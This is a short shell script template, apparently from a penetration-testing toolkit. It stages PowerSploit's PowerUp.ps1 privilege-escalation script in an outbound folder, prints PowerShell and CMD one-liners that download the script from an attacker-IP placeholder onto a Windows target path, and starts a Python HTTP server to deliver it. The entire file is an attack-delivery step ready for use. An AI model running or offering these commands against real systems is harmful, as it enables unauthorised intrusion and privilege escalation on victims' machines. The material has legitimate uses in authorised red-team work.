mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 packstation/outbound; \
echo '================================================================'; \
echo '                      -----PowerShell-----                      '; \
echo 'Deliver only: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/PowerUp.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\PowerUp.ps1'; \
echo '================================================================'; \
echo '                         -----CMD-----                          '; \
echo 'Deliver only: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/PowerUp.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\PowerUp.ps1'; \
echo '================================================================'; \
python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
